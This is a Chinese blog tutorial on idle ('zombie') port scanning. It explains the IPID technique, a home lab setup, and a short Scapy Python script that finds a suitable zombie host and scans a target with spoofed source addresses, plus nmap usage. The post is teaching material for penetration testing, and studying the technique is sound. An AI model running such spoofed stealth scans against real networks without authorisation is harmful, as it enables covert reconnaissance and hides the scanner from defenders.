      <content type="html"><![CDATA[<h2 id="0x00-信息收集简介"><a href="#0x00-信息收集简介" class="headerlink" title="0x00. 信息收集简介"></a><strong>0x00. 信息收集简介</strong></h2><h4 id="emsp-emsp-渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60-左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。"><a href="#emsp-emsp-渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60-左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。" class="headerlink" title="&emsp;&emsp;渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60%左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。"></a>&emsp;&emsp;渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60%左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。</h4><a id="more"></a>
<hr>
<h2 id="0x01-僵尸扫描介绍"><a href="#0x01-僵尸扫描介绍" class="headerlink" title="0x01. 僵尸扫描介绍"></a><strong>0x01. 僵尸扫描介绍</strong></h2><h3 id="emsp-emsp-往往鱼与熊掌不可得兼，僵尸扫描在隐藏踪迹的同时也有着其极其苛刻的使用条件。想要实施僵尸扫描必须具备下列两个必要条件"><a href="#emsp-emsp-往往鱼与熊掌不可得兼，僵尸扫描在隐藏踪迹的同时也有着其极其苛刻的使用条件。想要实施僵尸扫描必须具备下列两个必要条件" class="headerlink" title="&emsp;&emsp;往往鱼与熊掌不可得兼，僵尸扫描在隐藏踪迹的同时也有着其极其苛刻的使用条件。想要实施僵尸扫描必须具备下列两个必要条件"></a>&emsp;&emsp;往往鱼与熊掌不可得兼，僵尸扫描在隐藏踪迹的同时也有着其极其苛刻的使用条件。想要实施僵尸扫描必须具备下列两个必要条件</h3><h4 id="emsp-emsp-其一：有一台合格的僵尸机，所谓的僵尸机就是足够空闲，并且不和除了我们之外的任何其他机器进行网络通信的主机，这个主要取决于他的IPID的连续性（往往主流的操作系统的IPID都是随机产生的或全为0），后面会讲到。"><a href="#emsp-emsp-其一：有一台合格的僵尸机，所谓的僵尸机就是足够空闲，并且不和除了我们之外的任何其他机器进行网络通信的主机，这个主要取决于他的IPID的连续性（往往主流的操作系统的IPID都是随机产生的或全为0），后面会讲到。" class="headerlink" title="&emsp;&emsp;其一：有一台合格的僵尸机，所谓的僵尸机就是足够空闲，并且不和除了我们之外的任何其他机器进行网络通信的主机，这个主要取决于他的IPID的连续性（往往主流的操作系统的IPID都是随机产生的或全为0），后面会讲到。"></a>&emsp;&emsp;其一：有一台合格的僵尸机，所谓的僵尸机就是足够空闲，并且不和除了我们之外的任何其他机器进行网络通信的主机，这个主要取决于他的IPID的连续性（往往主流的操作系统的IPID都是随机产生的或全为0），后面会讲到。</h4><h4 id="emsp-emsp-其二：可伪造源IP地址，在某些网络设备中防火墙会限制伪造的源地址，导致扫描失败。"><a href="#emsp-emsp-其二：可伪造源IP地址，在某些网络设备中防火墙会限制伪造的源地址，导致扫描失败。" class="headerlink" title="&emsp;&emsp;其二：可伪造源IP地址，在某些网络设备中防火墙会限制伪造的源地址，导致扫描失败。"></a>&emsp;&emsp;其二：可伪造源IP地址，在某些网络设备中防火墙会限制伪造的源地址，导致扫描失败。</h4><hr>
<h2 id="0x02-僵尸扫描过程"><a href="#0x02-僵尸扫描过程" class="headerlink" title="0x02. 僵尸扫描过程"></a><strong>0x02. 僵尸扫描过程</strong></h2><p><img src="http://note.youdao.com/yws/public/resource/e55c97293d502f9ed0b9f032d920edbe/xmlnote/WEBRESOURCEb291547ca7a5e22852fd05ca2f2541ec/394" alt="image"></p>
<h3 id="如上图所示，该图清晰的像我们展示了僵尸扫描的全过程"><a href="#如上图所示，该图清晰的像我们展示了僵尸扫描的全过程" class="headerlink" title="如上图所示，该图清晰的像我们展示了僵尸扫描的全过程"></a>如上图所示，该图清晰的像我们展示了僵尸扫描的全过程</h3><h4 id="emsp-emsp-一-首先由本地主机-scanner-向僵尸机-zombie-发送一个SYN-ACK包，因为发送的数据包不是SYN包，所以zombie会觉得莫名奇妙居然会有人向我发送SYN-ACK包，于是zombie会原路返回一个RST包来中断连接，此时在RST包中便会带有zombie的IPID-假设此时的IPID-x。详细的tcp-ip通信过程点击这里"><a href="#emsp-emsp-一-首先由本地主机-scanner-向僵尸机-zombie-发送一个SYN-ACK包，因为发送的数据包不是SYN包，所以zombie会觉得莫名奇妙居然会有人向我发送SYN-ACK包，于是zombie会原路返回一个RST包来中断连接，此时在RST包中便会带有zombie的IPID-假设此时的IPID-x。详细的tcp-ip通信过程点击这里" class="headerlink" title="&emsp;&emsp;一.首先由本地主机(scanner)向僵尸机(zombie)发送一个SYN/ACK包，因为发送的数据包不是SYN包，所以zombie会觉得莫名奇妙居然会有人向我发送SYN/ACK包，于是zombie会原路返回一个RST包来中断连接，此时在RST包中便会带有zombie的IPID,假设此时的IPID=x。详细的tcp/ip通信过程点击这里"></a>&emsp;&emsp;一.首先由本地主机(scanner)向僵尸机(zombie)发送一个SYN/ACK包，因为发送的数据包不是SYN包，所以zombie会觉得莫名奇妙居然会有人向我发送SYN/ACK包，于是zombie会原路返回一个RST包来中断连接，此时在RST包中便会带有zombie的IPID,假设此时的IPID=x。详细的tcp/ip通信过程点击<a href="http://www.cnblogs.com/rootq/articles/1377355.html" target="_blank" rel="external">这里</a></h4><h4 id="emsp-emsp-二-紧接着又由本地主机-scanner-伪造源IP-SRC地址为zombie的IP，指定一个端口号并向目标主机-target-发送一个SYN包。收到SYN包后如果target端口开放-便会给源IP-SRC返回一个SYN-ACK包，此时由zombie收到该SYN-ACK包，此时便会同第一步一样，给target返回一个RST包，此时的IPID-x-1。如果端口未开放，target会直接给zombie返回一个RST包，zombie不做任何回应，IPID-x。"><a href="#emsp-emsp-二-紧接着又由本地主机-scanner-伪造源IP-SRC地址为zombie的IP，指定一个端口号并向目标主机-target-发送一个SYN包。收到SYN包后如果target端口开放-便会给源IP-SRC返回一个SYN-ACK包，此时由zombie收到该SYN-ACK包，此时便会同第一步一样，给target返回一个RST包，此时的IPID-x-1。如果端口未开放，target会直接给zombie返回一个RST包，zombie不做任何回应，IPID-x。" class="headerlink" title="&emsp;&emsp;二.紧接着又由本地主机(scanner)伪造源IP.SRC地址为zombie的IP，指定一个端口号并向目标主机(target)发送一个SYN包。收到SYN包后如果target端口开放,便会给源IP.SRC返回一个SYN/ACK包，此时由zombie收到该SYN/ACK包，此时便会同第一步一样，给target返回一个RST包，此时的IPID=x+1。如果端口未开放，target会直接给zombie返回一个RST包，zombie不做任何回应，IPID=x。"></a>&emsp;&emsp;二.紧接着又由本地主机(scanner)伪造源IP.SRC地址为zombie的IP，指定一个端口号并向目标主机(target)发送一个SYN包。收到SYN包后如果target端口开放,便会给源IP.SRC返回一个SYN/ACK包，此时由zombie收到该SYN/ACK包，此时便会同第一步一样，给target返回一个RST包，此时的IPID=x+1。如果端口未开放，target会直接给zombie返回一个RST包，zombie不做任何回应，IPID=x。</h4><h4 id="emsp-emsp-三-最后再由本地主机-scanner-给zombie发送一个SYN-ACK包，步骤和第一步一样，zombie返回一个RST包，但是此时的IPID和第一步有差别，我们便通过IPID所差的值判断target端口是否开放。如果此时的IPID-x-1则第二步时zombie没有发送任何数据包，于是可知target端口关闭；如果IPID-x-2则第二步时zombie发送了一个RST包，于是可知target端口开放。"><a href="#emsp-emsp-三-最后再由本地主机-scanner-给zombie发送一个SYN-ACK包，步骤和第一步一样，zombie返回一个RST包，但是此时的IPID和第一步有差别，我们便通过IPID所差的值判断target端口是否开放。如果此时的IPID-x-1则第二步时zombie没有发送任何数据包，于是可知target端口关闭；如果IPID-x-2则第二步时zombie发送了一个RST包，于是可知target端口开放。" class="headerlink" title="&emsp;&emsp;三. 最后再由本地主机(scanner)给zombie发送一个SYN/ACK包，步骤和第一步一样，zombie返回一个RST包，但是此时的IPID和第一步有差别，我们便通过IPID所差的值判断target端口是否开放。如果此时的IPID=x+1则第二步时zombie没有发送任何数据包，于是可知target端口关闭；如果IPID=x+2则第二步时zombie发送了一个RST包，于是可知target端口开放。"></a>&emsp;&emsp;三. 最后再由本地主机(scanner)给zombie发送一个SYN/ACK包，步骤和第一步一样，zombie返回一个RST包，但是此时的IPID和第一步有差别，我们便通过IPID所差的值判断target端口是否开放。如果此时的IPID=x+1则第二步时zombie没有发送任何数据包，于是可知target端口关闭；如果IPID=x+2则第二步时zombie发送了一个RST包，于是可知target端口开放。</h4><hr>
<h2 id="0x03-僵尸扫描实战篇"><a href="#0x03-僵尸扫描实战篇" class="headerlink" title="0x03. 僵尸扫描实战篇"></a><strong>0x03. 僵尸扫描实战篇</strong></h2><h4 id="emsp-emsp-看我写了这么多相信很多人都已经蒙圈了吧，理论有时后确实不容易理解，但是一旦理解了便会觉得just-soso-下面我直接给大家实战演习，看完实战篇再来看理论相信大家会获益匪浅"><a href="#emsp-emsp-看我写了这么多相信很多人都已经蒙圈了吧，理论有时后确实不容易理解，但是一旦理解了便会觉得just-soso-下面我直接给大家实战演习，看完实战篇再来看理论相信大家会获益匪浅" class="headerlink" title="&emsp;&emsp;看我写了这么多相信很多人都已经蒙圈了吧，理论有时后确实不容易理解，但是一旦理解了便会觉得just soso!下面我直接给大家实战演习，看完实战篇再来看理论相信大家会获益匪浅!"></a>&emsp;&emsp;看我写了这么多相信很多人都已经蒙圈了吧，理论有时后确实不容易理解，但是一旦理解了便会觉得just soso!下面我直接给大家实战演习，看完实战篇再来看理论相信大家会获益匪浅!</h4><h3 id="一：环境准备"><a href="#一：环境准备" class="headerlink" title="一：环境准备"></a>一：环境准备</h3><h4 id="emsp-emsp-扫描主机-Mac-ip-192-168-0-103"><a href="#emsp-emsp-扫描主机-Mac-ip-192-168-0-103" class="headerlink" title="&emsp;&emsp;扫描主机 Mac: { ip:192.168.0.103 }"></a>&emsp;&emsp;扫描主机 Mac: { ip:192.168.0.103 }</h4><h4 id="emsp-emsp-僵尸主机-xp-ip-192-168-0-107"><a href="#emsp-emsp-僵尸主机-xp-ip-192-168-0-107" class="headerlink" title="&emsp;&emsp;僵尸主机 xp: { ip:192.168.0.107 }"></a>&emsp;&emsp;僵尸主机 xp: { ip:192.168.0.107 }</h4><h4 id="emsp-emsp-目标主机-metasploitable2-ip-192-168-0-105"><a href="#emsp-emsp-目标主机-metasploitable2-ip-192-168-0-105" class="headerlink" title="&emsp;&emsp;目标主机 metasploitable2: { ip:192.168.0.105 }"></a>&emsp;&emsp;目标主机 metasploitable2: { ip:192.168.0.105 }</h4><h3 id="二-python2-7脚本"><a href="#二-python2-7脚本" class="headerlink" title="二: python2.7脚本"></a>二: python2.7脚本</h3><h4 id="emsp-emsp-其实nmap自带有僵尸扫描模块，但是我这里需要抓包给大家分析，所以自己写了个简单的python脚本-完整的脚本我放在云盘上-，用来发现僵尸机-zombie-和抓包分析，后面会直接演示如何用nmap进行僵尸机发现和利用。"><a href="#emsp-emsp-其实nmap自带有僵尸扫描模块，但是我这里需要抓包给大家分析，所以自己写了个简单的python脚本-完整的脚本我放在云盘上-，用来发现僵尸机-zombie-和抓包分析，后面会直接演示如何用nmap进行僵尸机发现和利用。" class="headerlink" title="&emsp;&emsp;其实nmap自带有僵尸扫描模块，但是我这里需要抓包给大家分析，所以自己写了个简单的python脚本(完整的脚本我放在云盘上)，用来发现僵尸机(zombie)和抓包分析，后面会直接演示如何用nmap进行僵尸机发现和利用。"></a>&emsp;&emsp;其实nmap自带有僵尸扫描模块，但是我这里需要抓包给大家分析，所以自己写了个简单的python脚本(完整的脚本我放在<a href="https://pan.baidu.com/s/1kUGwT6n" target="_blank" rel="external">云盘</a>上)，用来发现僵尸机(zombie)和抓包分析，后面会直接演示如何用nmap进行僵尸机发现和利用。</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">zombies_scan</span><span class="params">(zombie_ip)</span>:</span></div><div class="line">	rep1 = sr1(IP(dst=zombie_ip)/TCP(flags=<span class="string">'SA'</span>),timeout=<span class="number">2</span>)</div><div class="line">	send(IP(dst=zombie_ip)/TCP(flags=<span class="string">'SA'</span>))</div><div class="line">	rep2 = sr1(IP(dst=zombie_ip)/TCP(flags=<span class="string">'SA'</span>),timeout=<span class="number">2</span>)</div><div class="line">	<span class="keyword">if</span> rep2[IP].id == (rep1[IP].id+<span class="number">2</span>):</div><div class="line">		<span class="keyword">print</span> <span class="string">"[*]"</span> + zombie_ip + <span class="string">" is Incremental!"</span></div><div class="line">		target_ip = raw_input(<span class="string">"input the target_ip :"</span>)</div><div class="line">		port_scan(target_ip, zombie_ip)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">print</span> <span class="string">"[*]"</span> + zombie_ip + <span class="string">"is not Incremental!\n"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">port_scan</span><span class="params">(target_ip,zombie_ip)</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"------begin to scan target_ip!-------"</span></div><div class="line">	<span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</div><div class="line">		<span class="keyword">try</span>:</div><div class="line">			start = sr1(IP(dst=zombie_ip)/TCP(flags=<span class="string">'SA'</span>,dport=port),timeout=<span class="number">2</span>)</div><div class="line">			send(IP(src=zombie_ip,dst=target_ip)/TCP(flags=<span class="string">'S'</span>,dport=port))</div><div class="line">			end = sr1(IP(dst=zombie_ip)/TCP(flags=<span class="string">'SA'</span>),timeout=<span class="number">2</span>)</div><div class="line">			<span class="keyword">if</span> end[IP].id == (start[IP].id + <span class="number">2</span>):</div><div class="line">				<span class="keyword">print</span> <span class="string">"[*]"</span> + target_ip + <span class="string">':'</span> + port + <span class="string">"is open"</span></div><div class="line">		<span class="keyword">except</span>:</div><div class="line">			<span class="keyword">pass</span></div></pre></td></tr></table></figure>
<h4 id="第一个函数用来发现僵尸机，利用了Scapy库构造数据包，原理就是上面所讲的向要探测的僵尸主机连续发送三个SYN-ACK包，通过判断IPID的值来确定是否是个好僵尸。"><a href="#第一个函数用来发现僵尸机，利用了Scapy库构造数据包，原理就是上面所讲的向要探测的僵尸主机连续发送三个SYN-ACK包，通过判断IPID的值来确定是否是个好僵尸。" class="headerlink" title="第一个函数用来发现僵尸机，利用了Scapy库构造数据包，原理就是上面所讲的向要探测的僵尸主机连续发送三个SYN/ACK包，通过判断IPID的值来确定是否是个好僵尸。"></a>第一个函数用来发现僵尸机，利用了<a href="http://www.secdev.org/projects/scapy/" target="_blank" rel="external">Scapy库</a>构造数据包，原理就是上面所讲的向要探测的僵尸主机连续发送三个SYN/ACK包，通过判断IPID的值来确定是否是个好僵尸。</h4><h4 id="第二个函数和第一个函数差不多，同样是利用Scapy库构造数据包，原理上面第二步有，就不再啰嗦了。下面我来演示一下操作。"><a href="#第二个函数和第一个函数差不多，同样是利用Scapy库构造数据包，原理上面第二步有，就不再啰嗦了。下面我来演示一下操作。" class="headerlink" title="第二个函数和第一个函数差不多，同样是利用Scapy库构造数据包，原理上面第二步有，就不再啰嗦了。下面我来演示一下操作。"></a>第二个函数和第一个函数差不多，同样是利用<a href="http://www.secdev.org/projects/scapy/" target="_blank" rel="external">Scapy库</a>构造数据包，原理上面第二步有，就不再啰嗦了。下面我来演示一下操作。</h4><h3 id="三-操作步骤"><a href="#三-操作步骤" class="headerlink" title="三: 操作步骤"></a>三: 操作步骤</h3><h4 id="emsp-emsp-1-首先调用第一个函数判断xp是否是僵尸机"><a href="#emsp-emsp-1-首先调用第一个函数判断xp是否是僵尸机" class="headerlink" title="&emsp;&emsp;1.首先调用第一个函数判断xp是否是僵尸机"></a>&emsp;&emsp;1.首先调用第一个函数判断xp是否是僵尸机</h4><p>&emsp;&emsp;<img src="http://note.youdao.com/yws/public/resource/598b9fdb09cf92d23340b57f089a6af0/xmlnote/3992697E69534B5FBED8277FC7B4DB75/543" alt="image"></p>
<h4 id="emsp-emsp-2-抓包看看第一个函数是不是像我们预想中的那样发包的"><a href="#emsp-emsp-2-抓包看看第一个函数是不是像我们预想中的那样发包的" class="headerlink" title="&emsp;&emsp;2. 抓包看看第一个函数是不是像我们预想中的那样发包的"></a>&emsp;&emsp;2. 抓包看看第一个函数是不是像我们预想中的那样发包的</h4><p><img src="http://note.youdao.com/yws/public/resource/b91afbaa2cf1fba312e9ad33db824b91/xmlnote/722D8CFBF8C5463D982D4D1C1D9CDA9F/553" alt="image"></p>
<h4 id="可以看到发送的数据包正像我们预期中的一样，先发一个SYN-ACK，再收到一个RST-重复三次，判断IPID，这时再来看看IPID如何呢！"><a href="#可以看到发送的数据包正像我们预期中的一样，先发一个SYN-ACK，再收到一个RST-重复三次，判断IPID，这时再来看看IPID如何呢！" class="headerlink" title="可以看到发送的数据包正像我们预期中的一样，先发一个SYN/ACK，再收到一个RST,重复三次，判断IPID，这时再来看看IPID如何呢！"></a>可以看到发送的数据包正像我们预期中的一样，先发一个SYN/ACK，再收到一个RST,重复三次，判断IPID，这时再来看看IPID如何呢！</h4><p><img src="http://note.youdao.com/yws/public/resource/bbdd4a1c56e95d7e7d7977fed3245de6/xmlnote/CC31FE826865413293736F858508266A/563" alt="image"></p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/bbdd4a1c56e95d7e7d7977fed3245de6/xmlnote/BEDD4C00B4EE4D91BA8BE2E9440CBC87/565" alt="image"></p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/bbdd4a1c56e95d7e7d7977fed3245de6/xmlnote/24FE722B2D4141C6ADB1CD8340A07ED2/567" alt="image"></p>
<hr>
<h4 id="emsp-emsp-3-已经可以确定xp就是一个好僵尸了，那么接下来便是利用第二个函数对它来进行端口扫描。因为利用zombie时中途会伪装IP，所以我在Wireshark中没有发现连续的包，所以这里就不截数据包的图了。第二个函数的思路很清晰，希望懂python的朋友好好看看。"><a href="#emsp-emsp-3-已经可以确定xp就是一个好僵尸了，那么接下来便是利用第二个函数对它来进行端口扫描。因为利用zombie时中途会伪装IP，所以我在Wireshark中没有发现连续的包，所以这里就不截数据包的图了。第二个函数的思路很清晰，希望懂python的朋友好好看看。" class="headerlink" title="&emsp;&emsp;3. 已经可以确定xp就是一个好僵尸了，那么接下来便是利用第二个函数对它来进行端口扫描。因为利用zombie时中途会伪装IP，所以我在Wireshark中没有发现连续的包，所以这里就不截数据包的图了。第二个函数的思路很清晰，希望懂python的朋友好好看看。"></a>&emsp;&emsp;3. 已经可以确定xp就是一个好僵尸了，那么接下来便是利用第二个函数对它来进行端口扫描。因为利用zombie时中途会伪装IP，所以我在Wireshark中没有发现连续的包，所以这里就不截数据包的图了。第二个函数的思路很清晰，希望懂python的朋友好好看看。</h4><hr>
<h2 id="0x04-nmap中的僵尸扫描"><a href="#0x04-nmap中的僵尸扫描" class="headerlink" title="0x04. nmap中的僵尸扫描"></a><strong>0x04. nmap中的僵尸扫描</strong></h2><h4 id="emsp-emsp-在介绍nmap之前笔者有一个问题想要探讨一下，就是既然有了nmap这个无敌强大的扫描工具的存在，那么为什么我们还要自己写脚本呢？这里仅仅是我个人的理解，不喜勿喷，笔者认为其实工具仅仅是为了让我们更方便的做一些想做的事情，或许直接调用一个工具再添加一两个参数选项就能超越我们几十上百行脚本，也更能出色的完成任务，但是理解工具工作的原理是否更重要呢！一味的使用别人的工具而不去发现工具工作的原理最后是否只是个工具小子，笔者不屑！"><a href="#emsp-emsp-在介绍nmap之前笔者有一个问题想要探讨一下，就是既然有了nmap这个无敌强大的扫描工具的存在，那么为什么我们还要自己写脚本呢？这里仅仅是我个人的理解，不喜勿喷，笔者认为其实工具仅仅是为了让我们更方便的做一些想做的事情，或许直接调用一个工具再添加一两个参数选项就能超越我们几十上百行脚本，也更能出色的完成任务，但是理解工具工作的原理是否更重要呢！一味的使用别人的工具而不去发现工具工作的原理最后是否只是个工具小子，笔者不屑！" class="headerlink" title="&emsp;&emsp;在介绍nmap之前笔者有一个问题想要探讨一下，就是既然有了nmap这个无敌强大的扫描工具的存在，那么为什么我们还要自己写脚本呢？这里仅仅是我个人的理解，不喜勿喷，笔者认为其实工具仅仅是为了让我们更方便的做一些想做的事情，或许直接调用一个工具再添加一两个参数选项就能超越我们几十上百行脚本，也更能出色的完成任务，但是理解工具工作的原理是否更重要呢！一味的使用别人的工具而不去发现工具工作的原理最后是否只是个工具小子，笔者不屑！"></a>&emsp;&emsp;在介绍nmap之前笔者有一个问题想要探讨一下，就是既然有了nmap这个无敌强大的扫描工具的存在，那么为什么我们还要自己写脚本呢？这里仅仅是我个人的理解，不喜勿喷，笔者认为其实工具仅仅是为了让我们更方便的做一些想做的事情，或许直接调用一个工具再添加一两个参数选项就能超越我们几十上百行脚本，也更能出色的完成任务，但是理解工具工作的原理是否更重要呢！一味的使用别人的工具而不去发现工具工作的原理最后是否只是个工具小子，笔者不屑！</h4><h3 id="emsp-emsp-一：nmap发现僵尸机"><a href="#emsp-emsp-一：nmap发现僵尸机" class="headerlink" title="&emsp;&emsp;一：nmap发现僵尸机"></a>&emsp;&emsp;一：nmap发现僵尸机</h3><p>&emsp;&emsp;&emsp;<img src="http://note.youdao.com/yws/public/resource/a1a885c4b6b69e213e8ad40885aa4fc2/xmlnote/DDF61F18AB7C4A4183EF9D2F64176A89/605" alt="image"></p>
<h3 id="emsp-emsp-二：nmap利用僵尸机进行端口扫描"><a href="#emsp-emsp-二：nmap利用僵尸机进行端口扫描" class="headerlink" title="&emsp;&emsp;二：nmap利用僵尸机进行端口扫描"></a>&emsp;&emsp;二：nmap利用僵尸机进行端口扫描</h3><p>&emsp;&emsp;&emsp;<img src="http://note.youdao.com/yws/public/resource/a1a885c4b6b69e213e8ad40885aa4fc2/xmlnote/C44E28D7AFBA4D729187D66E8492598E/613" alt="image"></p>
<hr>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05. 总结"></a><strong>0x05. 总结</strong></h2><h4 id="emsp-emsp-虽然僵尸扫描的条件如此苛刻，但是原理just-soso！在某些情况下说不定它还能派上大的用场，免去很多不必要的麻烦，所谓技不压身，多学点知识技能对自己还是很有好处的-o-o"><a href="#emsp-emsp-虽然僵尸扫描的条件如此苛刻，但是原理just-soso！在某些情况下说不定它还能派上大的用场，免去很多不必要的麻烦，所谓技不压身，多学点知识技能对自己还是很有好处的-o-o" class="headerlink" title="&emsp;&emsp;虽然僵尸扫描的条件如此苛刻，但是原理just soso！在某些情况下说不定它还能派上大的用场，免去很多不必要的麻烦，所谓技不压身，多学点知识技能对自己还是很有好处的(o^^o)"></a>&emsp;&emsp;虽然僵尸扫描的条件如此苛刻，但是原理just soso！在某些情况下说不定它还能派上大的用场，免去很多不必要的麻烦，所谓技不压身，多学点知识技能对自己还是很有好处的(o^^o)</h4><hr>
]]></content>
      
        
    </entry>
    
  
  
</search>
